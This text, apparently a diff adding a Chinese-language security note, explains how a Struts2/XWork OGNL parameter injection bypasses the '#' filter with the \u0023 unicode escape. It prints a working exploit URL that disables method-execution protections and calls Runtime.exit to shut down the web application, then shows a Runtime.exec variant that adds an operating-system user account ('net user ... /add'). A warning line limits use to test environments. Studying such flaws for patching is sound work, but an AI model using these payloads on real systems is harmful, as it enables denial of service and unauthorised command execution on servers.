@@ -1,0 +1,20 @@
+
+Struts2的核心是使用的webwork框架,处理 action时通过调用底层的getter/setter方法来处理http的参数,它将每个http参数声明为一个ONGL(这里是ONGL的介绍)语句。当我们提交一个http参数:
+?user.address.city=Bishkek&user['favoriteDrink']=kumys 
+ONGL将它转换为:
+action.getUser().getAddress().setCity("Bishkek") 
+action.getUser().setFavoriteDrink("kumys")
+这是通过ParametersInterceptor(参数过滤器)来执行的,使用用户提供的HTTP参数调用 ValueStack.setValue()。
+为了防范篡改服务器端对象,XWork的ParametersInterceptor不允许参数名中出现“#”字符,但如果使用了Java的 unicode字符串表示\u0023,攻击者就可以绕过保护,修改保护Java方式执行的值:
+ 
+此处代码有破坏性,请在测试环境执行,严禁用此种方法进行恶意攻击
+?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1
+ 
+转义后是这样:
+?('#_memberAccess['allowStaticMethodAccess']')(meh)=true&(aaa)(('#context['xwork.MethodAccessor.denyMethodExecution']=#foo')(#foo=new%20java.lang.Boolean("false")))&(asdf)(('#rt.exit(1)')(#rt=@java.lang.Runtime@getRuntime()))=1
+ 
+OGNL处理时最终的结果就是
+java.lang.Runtime.getRuntime().exit(1); //关闭程序,即将web程序关闭
+类似的可以执行
+java.lang.Runtime.getRuntime().exec("net user 用户名 密码 /add");//增加操作系统用户,在有权限的情况下能成功(在URL中用%20替换空格,%2F替换/)
+只要有权限就可以执行任何DOS命令。
